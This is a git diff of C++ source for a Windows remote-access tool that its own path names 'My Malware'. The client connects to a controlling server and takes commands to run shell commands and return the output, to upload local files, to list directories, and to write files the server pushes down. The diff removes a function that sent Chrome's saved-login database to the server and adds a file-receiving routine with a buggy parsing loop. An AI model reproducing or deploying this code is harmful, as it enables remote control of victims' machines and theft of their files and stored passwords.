@@ -39,7 +39,6 @@ int Connection::boot() {
 
 void Connection::sendMessage(const char *data) {
     send(sock, data, strlen(data), 0);
-    return;
 }
 
 
@@ -59,7 +58,7 @@ void Connection::sendFile(string path) {
     LARGE_INTEGER fileSize;
     int totalReadData = 0;
     ::GetFileSizeEx(hFile, &fileSize);
-    sendMessage(to_string(fileSize.QuadPart).c_str());
+    send(sock, to_string(fileSize.QuadPart).c_str(), 15, 0);
 
     while (bytesRead != 0) {
         ::ReadFile(hFile, buffer.data(), BUFFER_SIZE, &bytesRead, NULL);
@@ -69,46 +68,55 @@ void Connection::sendFile(string path) {
     CloseHandle(hFile);
     cout << "File size is " << fileSize.QuadPart << endl;
     cout << "Total read data is " << totalReadData << endl;
+    cout << "Total read data is " << totalReadData << endl;
     char buff[9];
     recv(sock, buff, 9, 0);
     cout << "The final message is " << buff << endl;
-
-
-//    int total_file_read = 0;
-//    while (!file.eof()) {
-//        file.read(buffer.data(), BUFFER_SIZE);
-//        int size = file.gcount();
-//        total_file_read += size;
-//        cout << "File read size is " << size << endl;
-//        send(sock, buffer.data(), file.gcount(), 0);
-//    }
-//    cout << "Total file read size is " << total_file_read << endl;
-//    file.close();
-//    cout << "The size of the file is " << filesystem::file_size("path") << endl;
-    return;
 }
 
-//void Connection::recvFile() {
-//
-//    string fileNumber = readFile("C:\\Users\\All Users\\My Malware\\files\\filenumber");
-//    string path = "C:\\Users\\All Users\\My Malware\\files\\file_" + to_string(stoi(fileNumber) + 1);
-//    writeToFile(path, to_string(stoi(fileNumber) + 1));
-//    ofstream file(path, fstream::binary);
-//    unique_ptr<vector<char>> buffer = make_unique<vector<char>>(BUFFER_SIZE + 1, 0);
-//    int size;
-//
-//    while (true) {
-//        size = recv(sock, buffer->data(), BUFFER_SIZE, 0);
-//        if (!buffer->data() || size < 1024) {
-//            file.write(buffer->data(), size);
-//            file.flush();
-//            file.close();
-//            break;
-//        }
-//        file.write(buffer->data(), size);
-//    }
-//    return;
-//}
+void Connection::recvFile(string path) {
+    vector<char> buffer(BUFFER_SIZE + 1, 0);
+    HANDLE hFile = ::CreateFileA(path.c_str(), GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
+                                 NULL,
+                                 CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        sendMessage("Cant open the file");
+        cout << "Cant open the file" << endl;
+        CloseHandle(hFile);
+        return;
+    }
+
+    int totalFileSize = 0;
+    recv(sock, buffer.data(), 15, 0);
+
+    //buffer.data() with $
+    string firstString = buffer.data();
+    //buffer.data() without $
+    string secondString = "";
+
+    //Replacing all the $ at ''
+    for (int i = 0; i < firstString.size(); i++) {
+        if (firstString[i] == '$')
+            break;
+        secondString += firstString;
+    }
+
+    int fileSize = atoi(secondString.data());
+    cout << "File size is " << fileSize << endl;
+    cout << "File opened" << endl;
+
+
+    int size;
+    while (totalFileSize != fileSize) {
+        size = recv(sock, buffer.data(), BUFFER_SIZE, 0);
+        cout << "size is " << size << endl;
+        cout << "Data length is " << size << endl;
+        totalFileSize += size;
+        ::WriteFile(hFile, buffer.data(), size, NULL, NULL);
+        cout << totalFileSize << endl;
+    }
+    CloseHandle(hFile);
+}
 
 string Connection::getAllFiles(string path) {
     string files;
@@ -195,13 +203,6 @@ int Connection::startConnection() {
     return 0;
 }
 
-void Connection::getChromePasswords() {
-    string path = getenv("LOCALAPPDATA");
-    cout << path + "\\Google\\Chrome\\UserData\\Local State" << endl;
-    sendFile(path + "\\Google\\Chrome\\User Data\\Local State");
-    sendFile(path + "\\Google\\Chrome\\User Data\\default\\Login Data");
-}
-
 
 void Connection::connection() {
     startConnection();
@@ -219,34 +220,23 @@ void Connection::connection() {
             continue;
         }
 
-        //f12dsafewffdsa
-//f1233231d 23s 432 43fdsa2a4 f3ds2f432 fdsa432
-// 321rewfdsafdsaaf
-// ffdsadfs321fdsa
-//  r3
-//  24 32 432
-//  321 fds321ewf
-
-
         string command = string(buf, 0, static_cast<const unsigned int>(bytesReceived));
         cout << command << endl;
 
-        //There is a bug when disconnecting the camera (The program crash)
         if (!command.rfind("cmd")) {
             //Deleting the first 4 (cmd ) characters from the command
             command = command.substr(4, command.size() - 1);
             //Execute the command and saving the output in output
             string output = e1(command);
-            //Converting the command to unicode
-            wstring unOutput(begin(output), end(output));
-            //Send the results to the server
 
+            //Send the results to the server
             //If the command is not returning an output
-            if (output.size() == 0) {
+            if (output.empty()) {
                 send(sock, " ", 1, 0);
                 continue;
             }
-            send(sock, reinterpret_cast<const char *>(unOutput.c_str()), unOutput.size(), 0);
+            send(sock, reinterpret_cast<const char *>(output.c_str()), output.size(), 0);
+            cout << output << endl;
             continue;
         }
         //For quitting
@@ -257,12 +247,22 @@ void Connection::connection() {
             command = command.substr(10, command.size() - 1);
             sendFile(command);
             continue;
-        } else if (!command.rfind("get chrome passwords")) {
-            getChromePasswords();
-            continue;
-        } else if (!command.rfind("get files")) {
+        } //else if (!command.rfind("get chrome passwords")) {
+            //getChromePasswords();
+            //continue;
+            // }
+        else if (!command.rfind("send file")) {
+            vector<char> buffer(MAX_PATH + 1, 0);
+            recv(sock, buffer.data(), MAX_PATH, 0); //Where to save the file
+            cout << "The file path is " << buffer.data() << endl;
+            recvFile(buffer.data());
+        }
+
+
+        if (!command.rfind("get files")) {
             command = command.substr(10, command.size() - 1);
             string files = getAllFiles(command).c_str();
+            cout << files << endl;
             sendMessage(to_string(files.size()).c_str());
             sendMessage(files.c_str());
             continue;
